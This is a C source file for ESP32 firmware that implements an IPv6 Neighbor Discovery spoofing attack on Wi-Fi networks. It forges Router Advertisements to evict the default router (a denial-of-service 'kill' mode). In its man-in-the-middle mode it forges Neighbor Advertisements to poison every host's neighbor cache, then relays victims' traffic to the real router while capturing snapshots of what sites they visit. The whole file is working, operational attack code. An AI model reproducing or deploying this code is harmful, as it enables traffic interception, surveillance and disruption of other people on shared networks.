#include "polycast5_macros.h"

#include <string.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/event_groups.h"

#include "esp_log.h"
#include "esp_err.h"
#include "esp_attr.h" // EXT_RAM_BSS_ATTR (via POLYCAST5_USE_PSRAM_BSS)
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_netif.h"
#include "esp_private/wifi.h" // esp_wifi_internal_tx

#include "lwip/pbuf.h"
#include "lwip/netif.h"
#include "lwip/ip_addr.h"
#include "lwip/ip6_addr.h"

#include "wifi_task.h"
#include "wifi_utils.h"

#include "ndp_spoof.h"
#include "mitm_capture.h"

#define TAG "NDP_SPOOF"

#define NDP_REPOISON_MS 1000 // RA/RS/NA re-send interval
#define NDP_MIN_ETH_LEN 60   // Ethernet minimum frame length
#define NDP_ETH_HDR_LEN 14   // dst(6) + src(6) + ethertype(2)
#define NDP_RELAY_BUF_LEN 1600
#define NDP_RELAY_MAX_FWD_LEN 600 // L3 bytes: relay frames <= this (interactive); shed larger (bulk)
#define NDP_RELAY_SNAP_LEN 384 // Head bytes copied from a shed frame for the readout (mirrors CAP_SNAP_LEN)

// ICMPv6 message types
#define ICMP6_TYPE_RS 133 // Router Solicitation
#define ICMP6_TYPE_RA 134 // Router Advertisement
#define ICMP6_TYPE_NA 136 // Neighbor Advertisement

// NDP option types
#define NDP_OPT_SLLA 1   // Source Link-Layer Address
#define NDP_OPT_PREFIX 3 // Prefix Information

#define TIMER_GET_TIME_SEC() ((uint32_t)(esp_timer_get_time() / 1000000ULL))

// ff02::1 (all-nodes) and ff02::2 (all-routers), plus their multicast MACs
static const uint8_t s_ip6_all_nodes[16] =
        {0xff, 0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x01};
static const uint8_t s_ip6_all_routers[16] =
        {0xff, 0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x02};
static const uint8_t s_mac_all_nodes[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x01};
static const uint8_t s_mac_all_routers[6] = {0x33, 0x33, 0x00, 0x00, 0x00, 0x02};

static volatile ndp_spoof_mode_t s_mode = NDP_MODE_OFF; // Read by the worker and the IPv6 hook
static TaskHandle_t s_ndp_task_handle = NULL;

static uint8_t s_our_mac[6];
static uint8_t s_our_lladdr[16]; // Our link-local (EUI-64 from MAC)

static uint8_t s_router_lladdr[16]; // Real router link-local, learned from inbound RAs
static volatile bool s_router_learned = false;

static uint8_t s_router_mac[6]; // Real router MAC, learned from an RA's Source Link-Layer option
static volatile bool s_router_mac_valid = false;

static uint8_t s_prefix[16]; // Advertised prefix, learned from a Prefix Information option
static uint8_t s_prefix_len = 64;
static volatile bool s_prefix_valid = false;

// Scratch for the IPv6 L2 relay; only touched from the TCPIP thread (hook runs core-locked).
// In PSRAM to spare internal RAM (CPU-copied only, never DMA'd from directly).
POLYCAST5_USE_PSRAM_BSS static uint8_t s_relay_buf[NDP_RELAY_BUF_LEN];

static volatile uint32_t s_tx_drops = 0; // Relay re-inject failures (Wi-Fi TX buffer starvation)

// Stable per-run copy of the target. wifi_task reuses one shared struct per queue, so we copy it
// before handing its address to the worker; a later (even rejected) start then can't mutate a live
// run's parameters mid-flight.
static ndp_spoof_target_t s_run_target;

/**
 * @brief Build an IPv6 link-local address from a MAC using EUI-64
 */
static void ndp_build_link_local(uint8_t out[16], const uint8_t mac[6])
{
    memset(out, 0, 16);
    out[0] = 0xfe;
    out[1] = 0x80;
    out[8] = mac[0] ^ 0x02; // Flip the universal/local bit
    out[9] = mac[1];
    out[10] = mac[2];
    out[11] = 0xff;
    out[12] = 0xfe;
    out[13] = mac[3];
    out[14] = mac[4];
    out[15] = mac[5];
}

/**
 * @brief ICMPv6 checksum over the IPv6 pseudo-header + message (message cksum field must be 0)
 */
static uint16_t ndp_icmp6_checksum(const uint8_t src[16], const uint8_t dst[16],
                                   const uint8_t *icmp, uint16_t icmp_len)
{
    // ICMPv6's checksum covers a "pseudo-header" (source IP + dest IP + upper-layer length +
    // next-header = 58) and then the ICMPv6 message. Standard internet checksum: add everything up
    // as 16-bit big-endian words, fold the carries in, then one's-complement.
    uint32_t sum = 0;

    for (int i = 0; i < 16; i += 2) { // Pseudo-header: source address (8 words)
        sum += ((uint32_t)src[i] << 8) | src[i + 1];
    }
    for (int i = 0; i < 16; i += 2) { // Pseudo-header: destination address (8 words)
        sum += ((uint32_t)dst[i] << 8) | dst[i + 1];
    }
    sum += icmp_len; // Pseudo-header: upper-layer length (high 16 bits are 0 for our short messages)
    sum += 58;       // Pseudo-header: next header = ICMPv6

    for (int i = 0; i + 1 < icmp_len; i += 2) { // The ICMPv6 message itself, word by word
        sum += ((uint32_t)icmp[i] << 8) | icmp[i + 1];
    }
    if (icmp_len & 1) { // Odd trailing byte -> pad it with a zero low byte
        sum += (uint32_t)icmp[icmp_len - 1] << 8;
    }

    while (sum >> 16) { // Fold the carry bits back down into the low 16
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (uint16_t)(~sum); // One's complement of the folded sum
}

/**
 * @brief Assemble an Ethernet + IPv6 + ICMPv6 frame and transmit it
 *
 * @param [in] eth_dst  Destination MAC (a multicast group MAC)
 * @param [in] src_ip   IPv6 source address (16 bytes)
 * @param [in] dst_ip   IPv6 destination address (16 bytes)
 * @param [in] icmp     ICMPv6 message (checksum field at offset 2..3 must be zero)
 * @param [in] icmp_len ICMPv6 message length
 *
 * @returns ESP_OK if the driver accepted the frame for transmission
 */
static esp_err_t ndp_send(const uint8_t eth_dst[6], const uint8_t *src_ip, const uint8_t *dst_ip,
                     const uint8_t *icmp, uint16_t icmp_len)
{
    uint8_t f[128] = {0};

    // Ethernet header
    memcpy(f + 0, eth_dst, 6);
    memcpy(f + 6, s_our_mac, 6);
    f[12] = 0x86; f[13] = 0xDD; // EtherType: IPv6

    // IPv6 header
    f[14] = 0x60;                          // Version 6, traffic class 0
    f[18] = (uint8_t)(icmp_len >> 8);      // Payload length
    f[19] = (uint8_t)(icmp_len & 0xFF);
    f[20] = 58;                            // Next header: ICMPv6
    f[21] = 255;                           // Hop limit 255 (required for ND)
    memcpy(f + 22, src_ip, 16);
    memcpy(f + 38, dst_ip, 16);

    // ICMPv6 message (checksum field arrives zeroed from the caller)
    memcpy(f + 54, icmp, icmp_len);
    uint16_t ck = ndp_icmp6_checksum(src_ip, dst_ip, f + 54, icmp_len);
    f[56] = (uint8_t)(ck >> 8);
    f[57] = (uint8_t)(ck & 0xFF);

    uint16_t total = (uint16_t)(14 + 40 + icmp_len);
    if (total < NDP_MIN_ETH_LEN) {
        total = NDP_MIN_ETH_LEN; // Trailing bytes already zeroed
    }

    return esp_wifi_internal_tx(WIFI_IF_STA, f, total);
}

/**
 * @brief Send a Router Solicitation (prompts routers to advertise; used to learn + heal)
 */
static esp_err_t ndp_send_rs(void)
{
    uint8_t icmp[16] = {0};
    icmp[0] = ICMP6_TYPE_RS;
    // [1] code = 0, [2..3] checksum (filled in ndp_send), [4..7] reserved = 0

    // Source Link-Layer Address option
    icmp[8] = NDP_OPT_SLLA;
    icmp[9] = 1; // 1 unit of 8 bytes
    memcpy(icmp + 10, s_our_mac, 6);

    return ndp_send(s_mac_all_routers, s_our_lladdr, s_ip6_all_routers, icmp, 16);
}

/**
 * @brief Send a spoofed Router Advertisement sourced from the real router's link-local
 *
 * @param [in] router_lifetime Router lifetime in seconds (0 = evict the default router)
 * @param [in] with_prefix     Include a Prefix Information option (the kill path omits it so it
 *                             doesn't invent SLAAC prefix lifetimes)
 * @param [in] valid_lt        Prefix valid lifetime
 * @param [in] pref_lt         Prefix preferred lifetime
 *
 * @returns ESP_OK if the driver accepted the frame for transmission
 */
static esp_err_t ndp_send_ra(uint16_t router_lifetime, bool with_prefix,
                             uint32_t valid_lt, uint32_t pref_lt)
{
    uint8_t icmp[48] = {0};
    icmp[0] = ICMP6_TYPE_RA;
    // [1] code = 0, [2..3] checksum
    icmp[4] = 64; // Cur hop limit
    icmp[5] = 0;  // Flags (no managed/other)
    icmp[6] = (uint8_t)(router_lifetime >> 8);
    icmp[7] = (uint8_t)(router_lifetime & 0xFF);
    // [8..11] reachable time = 0, [12..15] retrans timer = 0

    uint16_t len = 16;

    // Prefix Information option (only when asked and we actually learned a prefix)
    if (with_prefix && s_prefix_valid) {
        uint8_t *o = icmp + 16;
        o[0] = NDP_OPT_PREFIX;
        o[1] = 4; // 4 units of 8 bytes = 32 bytes
        o[2] = s_prefix_len;
        o[3] = 0xC0; // On-link + Autonomous
        o[4] = (uint8_t)(valid_lt >> 24); o[5] = (uint8_t)(valid_lt >> 16);
        o[6] = (uint8_t)(valid_lt >> 8);  o[7] = (uint8_t)(valid_lt);
        o[8] = (uint8_t)(pref_lt >> 24);  o[9] = (uint8_t)(pref_lt >> 16);
        o[10] = (uint8_t)(pref_lt >> 8);  o[11] = (uint8_t)(pref_lt);
        // [12..15] reserved
        memcpy(o + 16, s_prefix, 16);
        len = 48;
    }

    return ndp_send(s_mac_all_nodes, s_router_lladdr, s_ip6_all_nodes, icmp, len);
}

/**
 * @brief Broadcast a spoofed Neighbor Advertisement mapping an IPv6 address to a MAC
 *
 * Used to poison every host's neighbor cache (target = router link-local, tlla = our MAC) so
 * their IPv6 upstream comes to us, and to heal it on stop (tlla = the router's real MAC).
 *
 * @param [in] target_ip The IPv6 address being claimed (16 bytes; also the source address)
 * @param [in] tlla_mac  The MAC to advertise for that address (Target Link-Layer Address)
 *
 * @returns ESP_OK if the driver accepted the frame for transmission
 */
static esp_err_t ndp_send_na(const uint8_t *target_ip, const uint8_t *tlla_mac)
{
    uint8_t icmp[32] = {0};
    icmp[0] = ICMP6_TYPE_NA;
    // [1] code = 0, [2..3] checksum (filled in ndp_send)
    icmp[4] = 0xA0; // Flags: Router=1, Solicited=0, Override=1
    // [5..7] reserved = 0
    memcpy(icmp + 8, target_ip, 16); // Target Address

    // Target Link-Layer Address option
    icmp[24] = 2; // Option type: Target Link-Layer Address
    icmp[25] = 1; // 1 unit of 8 bytes
    memcpy(icmp + 26, tlla_mac, 6);

    return ndp_send(s_mac_all_nodes, target_ip, s_ip6_all_nodes, icmp, 32);
}

/*
 * Strong override of ESP-IDF's __weak lwip_hook_ip6_input() (installed by
 * CONFIG_LWIP_HOOK_IP6_INPUT_DEFAULT). It does three things:
 *   1. While active, observe inbound Router Advertisements to learn the real router's
 *      link-local, MAC (Source Link-Layer option) and prefix. Observe only.
 *   2. In MitM mode, relay victims' internet-bound IPv6 to the real router (L2 bridge), and
 *      feed a snapshot to the serial MitM readout.
 *   3. Preserve ESP-IDF's default behavior: drop inbound IPv6 if the input netif has no
 *      link-local address yet, so nothing regresses when the feature is idle.
 */
int lwip_hook_ip6_input(struct pbuf *p, struct netif *inp)
{
    ndp_spoof_mode_t mode = s_mode;

    // Learn the router from an inbound RA (both KILL and MITM need this). Need the IPv6 header
    // plus the full RA header (40 + 16 = 56) to parse safely.
    // Keep learning while the active mode still lacks what it needs: KILL only needs the router's
    // link-local; MITM also needs its MAC (from the SLLA option), so a first RA that arrives without
    // SLLA must not latch us out of a later RA that carries it.
    bool need_learn = !s_router_learned || (mode == NDP_MODE_MITM && !s_router_mac_valid);
    if (mode != NDP_MODE_OFF && need_learn && p != NULL && p->tot_len >= 56) {
        // Only RAs matter. Cheap-reject non-RAs when the header is already contiguous in the first
        // pbuf; a chained header (p->len < 41) falls through to the copy below so we never miss one.
        const uint8_t *h = (const uint8_t *)p->payload;
        bool maybe_ra = (p->len < 41) ||
                        ((h[0] >> 4) == 6 && h[6] == 58 && h[40] == ICMP6_TYPE_RA);
        if (maybe_ra) {
            // Copy the head contiguously so options split across a chained pbuf aren't missed.
            uint8_t b[256];
            uint16_t blen = pbuf_copy_partial(p, b, sizeof(b), 0);

            // IPv6 header: b[0] high nibble = version (6), b[6] = next header (58 = ICMPv6),
            // b[7] = hop limit, b[40] = ICMPv6 type, b[41] = code. Validate a well-formed RA from an
            // on-link router: hop limit MUST be 255 (RFC 4861 - anything less is off-link/spoofed),
            // code 0, and the source a link-local fe80::/10 (b[8]==0xfe, top 2 bits of b[9] == 10).
            if (blen >= 56 && (b[0] >> 4) == 6 && b[6] == 58 && b[7] == 255 &&
                    b[40] == ICMP6_TYPE_RA && b[41] == 0 &&
                    b[8] == 0xfe && (b[9] & 0xc0) == 0x80) {
                memcpy(s_router_lladdr, b + 8, 16); // Remember the router's link-local (RA/NA source)

                // RA options follow the 16-byte RA header, i.e. start at b[56]. Each option is a TLV:
                // [type][length]... where length counts 8-byte units (option size = length * 8 bytes,
                // head included). Walk them looking for the router's MAC and the on-link prefix.
                uint16_t off = 56;
                while ((uint16_t)(off + 2) <= blen) {
                    uint8_t units = b[off + 1]; // Option length in 8-byte units
                    if (units == 0) {
                        break; // Malformed (a zero-length option would loop forever)
                    }
                    uint16_t obytes = (uint16_t)units * 8; // Option size in bytes
                    if ((uint16_t)(off + obytes) > blen) {
                        break; // Option runs past what we captured
                    }
                    if (b[off] == NDP_OPT_SLLA && obytes >= 8) {
                        memcpy(s_router_mac, b + off + 2, 6); // Source Link-Layer: MAC at bytes 2..7
                        s_router_mac_valid = true;
                    } else if (b[off] == NDP_OPT_PREFIX && obytes >= 32) {
                        s_prefix_len = b[off + 2];          // Prefix Information: prefix length in bits
                        memcpy(s_prefix, b + off + 16, 16); // ...and the /prefix itself at bytes 16..31
                        s_prefix_valid = true;
                    }
                    off = (uint16_t)(off + obytes); // Advance to the next option
                }

                s_router_learned = true;
            }
        }
    }

    // MitM relay: selectively forward victims' router-bound IPv6 to the real router (bulk upstream
    // is shed below) so they can keep browsing while it passes through us. A packet reaches us only
    // because the neighbor cache is poisoned, so relay any unicast that isn't addressed to us: covers
    // internet-bound traffic (global unicast) AND traffic aimed straight at the router's
    // link-local (e.g. DNS to a link-local resolver, pinging the router). Multicast and packets
    // for our own address fall through to normal processing.
    if (mode == NDP_MODE_MITM && s_router_mac_valid && p != NULL && p->len >= 40) {
        const uint8_t *b = (const uint8_t *)p->payload;
        // Destination address is b[24..39]. Relay it if it's unicast (b[24] != 0xff, i.e. not
        // ff00::/8 multicast) and not one of our own addresses -> it only reached us via the poison.
        if (b[24] != 0xff && memcmp(b + 24, s_our_lladdr, 16) != 0) {
            // Selective relay (see arp_spoof.c): forward only small/interactive IPv6 (DNS, TLS
            // ClientHello, requests, ACKs, control) and shed bulk upstream so one STA doesn't stall
            // the subnet. The readout still snapshots shed frames, so which-sites recon is intact.
            uint16_t total = p->tot_len;
            if ((uint32_t)total + NDP_ETH_HDR_LEN <= sizeof(s_relay_buf)) {
                memcpy(s_relay_buf + 0, s_router_mac, 6); // dst: real router
                memcpy(s_relay_buf + 6, s_our_mac, 6);    // src: us
                s_relay_buf[12] = 0x86;                   // EtherType: IPv6
                s_relay_buf[13] = 0xDD;

                // Copy the packet head first - contiguous, even if the RX pbuf is chained - so we
                // can classify it and feed the readout. Reading p->payload directly can miss the L4
                // payload byte when the first pbuf holds only the headers.
                uint16_t head = (total > NDP_RELAY_SNAP_LEN) ? NDP_RELAY_SNAP_LEN : total;
                pbuf_copy_partial(p, s_relay_buf + NDP_ETH_HDR_LEN, head, 0);

                // Serial MitM readout - runs for shed frames too, so recon is intact
                mitm_capture_submit(true, s_relay_buf + NDP_ETH_HDR_LEN, head);

                // Always relay connection-establishing packets (DNS, TLS ClientHello, HTTP requests,
                // QUIC/HTTP-3 handshakes) regardless of size so handshakes complete and pages load;
                // otherwise forward only small/interactive frames and shed bulk upstream.
                if (mitm_capture_is_priority(true, s_relay_buf + NDP_ETH_HDR_LEN, head) ||
                        total <= NDP_RELAY_MAX_FWD_LEN) {
                    // Copy the rest of the frame (if any) before transmitting the whole thing
                    if (total > head) {
                        pbuf_copy_partial(p, s_relay_buf + NDP_ETH_HDR_LEN + head, total - head, head);
                    }
                    uint16_t txlen = (uint16_t)(total + NDP_ETH_HDR_LEN);
                    if (txlen < NDP_MIN_ETH_LEN) { // Pad small frames to the Ethernet minimum
                        memset(s_relay_buf + txlen, 0, NDP_MIN_ETH_LEN - txlen);
                        txlen = NDP_MIN_ETH_LEN;
                    }
                    int txerr = esp_wifi_internal_tx(WIFI_IF_STA, s_relay_buf, txlen);
                    if (txerr != ESP_OK) {
                        // NO_MEM == Wi-Fi TX buffers exhausted (starvation). Rate-limited log.
                        s_tx_drops++;
                        if ((s_tx_drops & 0x3F) == 1) {
                            // ESP_LOGW(TAG, "relay TX drop: %s (total %" PRIu32 ") - raise "
                            //         "CONFIG_ESP_WIFI_STATIC_TX_BUFFER_NUM if this keeps climbing",
                            //         esp_err_to_name(txerr), s_tx_drops);
                        }
                    }
                }
                // else: bulk frame captured for the readout but intentionally not relayed (shed)
            }
            pbuf_free(p);
            return 1; // Eaten
        }
    }

    // Preserve ESP-IDF's default IPv6 input hook: drop inbound IPv6 while the input netif has no
    // link-local address (prevents e.g. a router's RDNSS multicast rewriting DNS before SLAAC).
    if (p != NULL && inp != NULL && ip6_addr_isany(ip_2_ip6(&inp->ip6_addr[0]))) {
        pbuf_free(p);
        return 1;
    }
    return 0;
}

/*
 * Runs in the tcpip thread (via esp_netif_tcpip_exec): tear down the IPv6 address(es) we brought up
 * at start so the station returns to its default IPv4-only state on stop. Zeroing each slot (not
 * just invalidating it) re-arms the hook's "drop inbound IPv6 until a link-local exists" guard
 * above, so an idle device doesn't keep processing IPv6 (SLAAC/RAs) just because a session once ran.
 */
static esp_err_t ndp_teardown_ip6_cb(void *ctx)
{
    (void)ctx;
    struct netif *nif = netif_default; // The STA netif while connected
    if (nif == NULL) {
        return ESP_FAIL;
    }
    ip6_addr_t zero6;
    ip6_addr_set_zero(&zero6);
    // Only invalidate the link-local we created - always slot 0 (netif_create_ip6_linklocal_address
    // uses index 0). Leave any other IPv6 addresses on the netif untouched so we can't clobber
    // pre-existing config. Zeroing the bytes (not just invalidating) re-arms the isany guard above.
    if (!ip6_addr_isany(netif_ip6_addr(nif, 0))) {
        netif_ip6_addr_set_state(nif, 0, IP6_ADDR_INVALID); // MLD-leave + mark the slot free
        netif_ip6_addr_set(nif, 0, &zero6);                 // Zero the bytes so the isany guard re-arms
    }
    return ESP_OK;
}

bool ndp_spoof_is_running(void)
{
    return s_ndp_task_handle != NULL;
}

static void ndp_spoof_task(void *pvParameters)
{
    ndp_spoof_target_t *target = (ndp_spoof_target_t *)pvParameters;
    ndp_spoof_stats_t stats = {0};

    // Snapshot the mode: s_mode is set to OFF before the heal step below
    const ndp_spoof_mode_t run_mode = target->mode;

    uint32_t ras_sent = 0;
    uint32_t start_time = TIMER_GET_TIME_SEC();

#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "ndp_spoof_task started: mode=%d, duration=%" PRIu32 "s",
            (int)run_mode, target->duration_sec);
#endif

    while (1) {
        uint32_t elapsed = TIMER_GET_TIME_SEC() - start_time;
        if (elapsed >= target->duration_sec) {
            break;
        }
        if (xEventGroupGetBits(xWifiEventGroup) & WIFI_STOP_NDP_SPOOF_BIT) {
            xEventGroupClearBits(xWifiEventGroup, WIFI_STOP_NDP_SPOOF_BIT);
            break;
        }
        // Wi-Fi dropped -> stop; don't leave the hook armed for a reconnect (maybe a different LAN)
        if (!(xEventGroupGetBits(xWifiEventGroup) & WIFI_CONNECTED_BIT)) {
            break;
        }

        // "Ready" gate: KILL needs only the router's link-local; MITM also needs its MAC (from the
        // RA's SLLA option) so it can actually relay. Poisoning in MITM before we can relay would
        // just DoS IPv6 instead of MitM'ing it, so keep soliciting until the SLLA is learned.
        bool ready = s_router_learned && (run_mode != NDP_MODE_MITM || s_router_mac_valid);

        if (ready) {
            esp_err_t txr = (run_mode == NDP_MODE_MITM)
                    ? ndp_send_na(s_router_lladdr, s_our_mac) // MitM: claim router LL is at our MAC
                    : ndp_send_ra(0, false, 0, 0);            // Kill: evict the default router
            if (txr == ESP_OK) { // Count only frames the driver accepted
                ras_sent++;
            }
        } else {
            // Not ready -> keep soliciting until we've learned what we need
            ndp_send_rs();
        }

        stats.spoofing = true;
        stats.router_learned = ready; // UI shows "search..." until we can actually act
        stats.ras_sent = ras_sent;
        stats.tx_drops = s_tx_drops;
        stats.duration_sec = target->duration_sec;
        (void)xQueueOverwrite(xWifiNdpSpoofStatsQueue, &stats);

        vTaskDelay(pdMS_TO_TICKS(NDP_REPOISON_MS));
    }

    // Stop the hook from relaying/learning before we heal
    s_mode = NDP_MODE_OFF;

    // Heal. MITM: restore the correct neighbor mapping (router link-local -> real router MAC) with
    // corrective NAs. KILL: do NOT forge an RA with invented lifetimes/flags -> instead just prompt
    // the real router (below) to re-announce its genuine RA, which restores the true default route
    // and prefix parameters.
    if (run_mode == NDP_MODE_MITM && s_router_learned && s_router_mac_valid) {
        for (int i = 0; i < 3; ++i) {
            ndp_send_na(s_router_lladdr, s_router_mac);
            vTaskDelay(pdMS_TO_TICKS(150));
        }
    }
    // Solicit the real router so it re-advertises its genuine RA (restores default route + prefix)
    ndp_send_rs();
    ndp_send_rs();

    // Tear down the link-local we brought up at start so IPv6 drops back to its idle (disabled)
    // state; otherwise the STA would keep processing inbound IPv6 for the rest of the boot session.
    esp_netif_tcpip_exec(ndp_teardown_ip6_cb, NULL);

    stats.spoofing = false;
    stats.router_learned = s_router_learned;
    stats.ras_sent = ras_sent;
    stats.tx_drops = s_tx_drops;
    stats.duration_sec = target->duration_sec;
    (void)xQueueOverwrite(xWifiNdpSpoofStatsQueue, &stats);

#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "ndp_spoof_task done: %" PRIu32 " RAs sent, router_learned=%d",
            ras_sent, (int)s_router_learned);
#endif

    // Release the relay low-latency hold taken in ndp_spoof_start (paired; refcounted)
    if (run_mode == NDP_MODE_MITM) {
        wifi_utils_relay_lowlatency(false);
    }

    s_ndp_task_handle = NULL;
    vTaskDelete(NULL);
}

esp_err_t ndp_spoof_start(ndp_spoof_target_t *target)
{
    if (s_ndp_task_handle != NULL) {
        ESP_LOGW(TAG, "ndp_spoof_start: already running");
        return ESP_ERR_INVALID_STATE;
    }
    if (!target) {
        ESP_LOGE(TAG, "ndp_spoof_start: NULL target");
        return ESP_ERR_INVALID_ARG;
    }
    if (target->duration_sec == 0) {
        ESP_LOGE(TAG, "ndp_spoof_start: duration_sec is zero");
        return ESP_ERR_INVALID_ARG;
    }
    if (target->mode != NDP_MODE_KILL && target->mode != NDP_MODE_MITM) {
        ESP_LOGE(TAG, "ndp_spoof_start: invalid mode %d", (int)target->mode);
        return ESP_ERR_INVALID_ARG;
    }
    if (!(xEventGroupGetBits(xWifiEventGroup) & WIFI_CONNECTED_BIT)) {
        ESP_LOGW(TAG, "ndp_spoof_start: not connected to a network");
        return ESP_ERR_INVALID_STATE;
    }

    esp_err_t err = esp_wifi_get_mac(WIFI_IF_STA, s_our_mac);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "ndp_spoof_start: esp_wifi_get_mac failed: %s", esp_err_to_name(err));
        return err;
    }
    ndp_build_link_local(s_our_lladdr, s_our_mac);

    // This project never activates IPv6 on the station, so the netif isn't joined to all-nodes
    // multicast and the driver won't hand us Router Advertisements. Bring up a link-local so we
    // join ff02::1 and can actually receive (and learn from) the router's RAs. (esp_netif_create_
    // ip6_linklocal only creates the link-local; it doesn't need LWIP_IPV6_AUTOCONFIG.)
    // The link-local is essential: without it the STA isn't joined to the RA multicast group, so the
    // hook never learns the router and the session would sit at "v6: search..." for its whole
    // duration while reporting success. Treat a failure here as a start failure (rolling back any
    // partial address) so the UI reverts instead of showing a stuck session.
    esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (sta == NULL) {
        ESP_LOGE(TAG, "ndp_spoof_start: STA netif not found");
        return ESP_ERR_INVALID_STATE;
    }
    esp_err_t ll_err = esp_netif_create_ip6_linklocal(sta);
    if (ll_err != ESP_OK) {
        ESP_LOGE(TAG, "ndp_spoof_start: esp_netif_create_ip6_linklocal failed: %s", esp_err_to_name(ll_err));
        esp_netif_tcpip_exec(ndp_teardown_ip6_cb, NULL); // undo any partial address
        return ll_err;
    }

    s_router_learned = false;
    s_router_mac_valid = false;
    s_prefix_valid = false;
    s_tx_drops = 0;
    memset(s_router_lladdr, 0, sizeof(s_router_lladdr));
    memset(s_router_mac, 0, sizeof(s_router_mac));

    // Take a stable copy the worker owns for its whole run (see s_run_target)
    s_run_target = *target;

    // Enable the input hook, then start
    s_mode = s_run_target.mode;

    // Take the low-latency hold BEFORE creating the worker (see arp_spoof_start): its paired release
    // runs on the worker's exit and must not be able to run before this acquire. Undone below if
    // task creation fails.
    if (s_run_target.mode == NDP_MODE_MITM) {
        wifi_utils_relay_lowlatency(true);
    }

    BaseType_t ret = xTaskCreate(ndp_spoof_task, "ndp_spoof", (1024 * 4), &s_run_target, POLYCAST5_PRIORITY_MEDIUM, &s_ndp_task_handle);
    if (ret != pdPASS) {
        s_mode = NDP_MODE_OFF;
        s_ndp_task_handle = NULL;
        if (s_run_target.mode == NDP_MODE_MITM) {
            wifi_utils_relay_lowlatency(false); // undo the hold taken above
        }
        // The worker (which normally heals + tears down) never ran, so undo the link-local we
        // brought up above - otherwise the STA keeps processing inbound IPv6 until reboot.
        esp_netif_tcpip_exec(ndp_teardown_ip6_cb, NULL);
        ESP_LOGE(TAG, "ndp_spoof_start: failed to create ndp_spoof_task");
        return ESP_FAIL;
    }

    return ESP_OK;
}
